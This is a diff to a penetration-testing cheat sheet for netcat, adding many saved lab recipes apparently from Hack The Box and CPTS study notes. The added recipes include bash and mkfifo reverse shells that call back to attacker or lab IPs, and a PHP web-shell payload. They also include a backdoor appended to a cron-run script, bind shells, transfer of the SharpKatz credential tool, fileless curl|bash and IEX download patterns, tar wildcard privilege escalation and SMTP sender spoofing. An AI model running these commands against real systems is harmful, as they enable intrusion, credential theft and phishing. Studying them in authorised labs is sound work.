@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=netcat) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,444 @@ A plain TCP connection is not itself a shell; use the Windows/Linux reverse-shel
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=netcat)
+## Notebook recipes
 
-## Learning and original examples
+29 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ nc -lvnp 9001
+
+listening on [any] 9001 ...
+connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471
+
+PS C:\Windows\system32> whoami;hostname
+
+nt authority\system
+WIN11BOX
+```
+
+</Accordion>
+
+<Accordion title="Phase 5 — Upgrading to an Interactive Reverse Shell">
+
+### Phase 5 — Upgrading to an Interactive Reverse Shell
+
+**Common Services: Personal Assessment Notes**
+
+```text
+nc -lvnp 4444
+```
+
+</Accordion>
+
+<Accordion title="Netcat / Ncat File Transfers">
+
+### Netcat / Ncat File Transfers
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On target (listener — receives file)
+nc -l -p 8000 > SharpKatz.exe               # original netcat
+ncat -l -p 8000 --recv-only > SharpKatz.exe  # ncat version
+
+# On attacker (sends file)
+nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe               # -q 0 = quit after EOF
+ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe       # ncat version
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker (listener — sends file)
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+# On target (connects and receives)
+nc <ATTACKER_IP> 443 > SharpKatz.exe
+ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Attacker listens
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+# Target connects with bash
+cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Windows LOLBins">
+
+### Windows LOLBins
+
+**File Transfers for Linux and Windows**
+
+```bash
+# On attacker — start listener
+sudo nc -lvnp 8000
+```
+
+</Accordion>
+
+<Accordion title="Shells — the heart of &quot;access&quot;">
+
+### Shells — the heart of "access"
+
+**Getting Started with Penetration Testing**
+
+```bash
+# Reverse shell: attacker listens, target connects back
+nc -lvnp 4444                       # on YOUR box
+bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1   # on the TARGET
+
+# Bind shell: target listens, you connect in
+nc -lvnp 4444 -e /bin/bash          # on the TARGET
+nc <TARGET_IP> 4444                  # on YOUR box
+```
+
+</Accordion>
+
+<Accordion title="Exploitation steps">
+
+### Exploitation steps
+
+**HTB Nibbles: Walkthrough and Report**
+
+```php
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 9443 >/tmp/f'); ?>
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+nc -lvnp 9443
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 8443 >/tmp/f' \
+  | tee -a /home/nibbler/personal/stuff/monitor.sh
+```
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+nc -lvnp 8443
+```
+
+</Accordion>
+
+<Accordion title="6. Networking / pentest quick commands">
+
+### 6. Networking / pentest quick commands
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+ip a                # show interfaces & IPs (replaces ifconfig)
+ip a show tun0      # just the VPN interface (HTB/CPTS uses tun0)
+ip route            # routing table
+ss -tulpn           # listening ports (replaces netstat)
+ping -c 4 10.10.10.10
+curl -s http://target/ | less       # fetch a page
+curl -I http://target/               # headers only
+wget http://target/file              # download a file
+nc -lvnp 4444       # netcat listener (catch reverse shells)
+python3 -m http.server 80            # quick web server to transfer files
+```
+
+</Accordion>
+
+<Accordion title="10. Test domain-controller connectivity">
+
+### 10. Test domain-controller connectivity
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+nc -vz DC_IP 53
+nc -vz DC_IP 88
+nc -vz DC_IP 389
+nc -vz DC_IP 445
+nc -vz DC_IP 3268
+```
+
+</Accordion>
+
+<Accordion title="DCOnly works but All fails">
+
+### DCOnly works but All fails
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+nc -vz HOST_IP 445
+```
+
+</Accordion>
+
+<Accordion title="Wildcard">
+
+### Wildcard
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+# create file for exploitation
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+
+# vulnerable script
+tar cf archive.tar *
+```
+
+</Accordion>
+
+<Accordion title="Rsync">
+
+### Rsync
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+sudo nmap -sV -p 873 <IP>
+nc -nv <IP> 873          # then send: @RSYNCD: 31.0  /  #list   to enumerate modules
+
+rsync -av --list-only rsync://<IP>/<share>     # list a share's contents
+rsync -av rsync://<IP>/<share> ./loot/          # download everything
+rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
+```
+
+</Accordion>
+
+<Accordion title="Connecting by hand">
+
+### Connecting by hand
+
+**Read and Search Email with POP3 and IMAP**
+
+```bash
+# Plaintext
+nc <IP> 110          # POP3
+nc <IP> 143          # IMAP
+
+# Encrypted (use these when only 993/995 are open, or to upgrade a plain port)
+openssl s_client -connect <IP>:995                    # POP3S
+openssl s_client -connect <IP>:110 -starttls pop3     # upgrade plain POP3 to TLS
+openssl s_client -connect <IP>:143 -starttls imap     # upgrade plain IMAP to TLS
+```
+
+</Accordion>
+
+<Accordion title="Step 0: Enumerate valid usernames over SMTP">
+
+### Step 0: Enumerate valid usernames over SMTP
+
+**Read and Search Email with POP3 and IMAP**
+
+```bash
+# Manual check with netcat
+nc <IP> 25
+VRFY root
+VRFY nonexistentuser123
+# Compare the two response codes — a difference means VRFY leaks valid users
+```
+
+</Accordion>
+
+<Accordion title="Primary use: username enumeration">
+
+### Primary use: username enumeration
+
+**SMTP Enumeration and Relay Checks**
+
+```bash
+# Manual — connect and compare the response codes
+nc -nv <IP> 25
+VRFY root                 # 250/252 = exists, 550 = doesn't
+VRFY nonexistent12345     # compare this response to the one above
+```
+
+</Accordion>
+
+<Accordion title="Secondary use: open relay (spoofing &amp; phishing)">
+
+### Secondary use: open relay (spoofing & phishing)
+
+**SMTP Enumeration and Relay Checks**
+
+```bash
+nmap -p25 --script smtp-open-relay <IP>          # detect open relay automatically
+
+# Manual test: from an external sender to an external recipient
+nc -nv <IP> 25
+HELO test.com
+MAIL FROM:<ceo@target.com>            # spoof an internal sender
+RCPT TO:<victim@external.com>         # to an external recipient
+DATA
+Subject: Urgent
+Please review the attached.
+.
+QUIT
+# If the server accepts all of this (250s) and delivers it, it's an open relay.
+```
+
+</Accordion>
+
+<Accordion title="Actual Bind Shell with Netcat">
+
+### Actual Bind Shell with Netcat
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Target (server) — bind bash to the TCP listener
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> 7777 > /tmp/f
+
+# Attack box (client) — connect to get shell
+nc -nv <TARGET_IP> 7777
+```
+
+**Shells, Payloads, and Interactive TTYs**
+
+Context from the notebook: | nc -l &lt;IP> 7777 Pipe Bash output back through netcat to the attacker
+
+```text
+| nc -l <IP> 7777
+```
+
+</Accordion>
+
+<Accordion title="Bash Reverse Shell One-Liner (Linux Target)">
+
+### Bash Reverse Shell One-Liner (Linux Target)
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
+```
+
+</Accordion>
+
+<Accordion title="Netcat Listener (Attack Box)">
+
+### Netcat Listener (Attack Box)
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+sudo nc -lvnp 443
+```
+
+</Accordion>
+
+<Accordion title="Raw Netcat Connection (Text Only — Not a Shell)">
+
+### Raw Netcat Connection (Text Only — Not a Shell)
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Target (server) — start listener
+nc -lvnp 7777
+
+# Attack box (client) — connect
+nc -nv <TARGET_IP> 7777
+```
+
+</Accordion>
+
+<Accordion title="PowerShell Web Uploads">
+
+### PowerShell Web Uploads
+
+**File Transfers for Linux and Windows**
+
+Context from the notebook: Catch on attack box with  nc -lvnp 8000 , then decode the base64 body.
+
+```text
+nc -lvnp 8000
+```
+
+</Accordion>
+
+<Accordion title="Windows — Invoke-TheHash (PowerShell)">
+
+### Windows — Invoke-TheHash (PowerShell)
+
+**Pass the Hash from Linux and Windows**
+
+Context from the notebook: The base64 blob is a PowerShell reverse shell (encode one from  Reverse shell  / revshells.com → "PowerShell #3 (Base64)") pointed at your listener. Start a listener ( nc -lvnp &lt;port> ) first.
+
+```text
+nc -lvnp <port>
+```
+
+</Accordion>
+
+<Accordion title="🚨 THE MTU TRAP">
+
+### 🚨 THE MTU TRAP
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Symptom:  SSH/RDP/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while  ping  and  nc -z &lt;port>  succeed.  Cause:  small packets (SYN, ping) pass, but the  large packets  (SSH key exchange, RDP/TLS handshake, a Kerberos AS‑REQ carrying a certificate) exceed the VPN's path MTU, get fragmented, and are dropped.  Fix:
+
+```text
+nc -z <port>
+```
+
+</Accordion>
+
+</AccordionGroup>
